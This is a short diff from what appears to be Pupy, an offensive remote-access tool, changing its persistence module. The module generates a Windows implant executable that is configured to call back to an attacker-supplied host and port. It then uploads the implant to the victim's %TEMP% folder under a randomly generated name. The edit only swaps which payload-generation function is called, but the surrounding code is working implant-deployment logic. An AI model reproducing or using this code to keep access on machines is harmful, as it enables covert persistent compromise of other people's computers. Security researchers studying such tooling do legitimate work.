@@ -27,7 +27,7 @@ class PersistenceModule(PupyModule):
 
 			self.info("generating exe ...")
 			#generating exe
-			exebuff=genpayload.get_edit_binary(os.path.join("payloads","pupyx86.exe"), host, port)
+			exebuff=genpayload.get_edit_pupyx86_exe(host, port)
 
 			remote_path=self.client.conn.modules['os.path'].expandvars("%TEMP%\\{}.exe".format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))
 			self.info("uploading to %s ..."%remote_path)
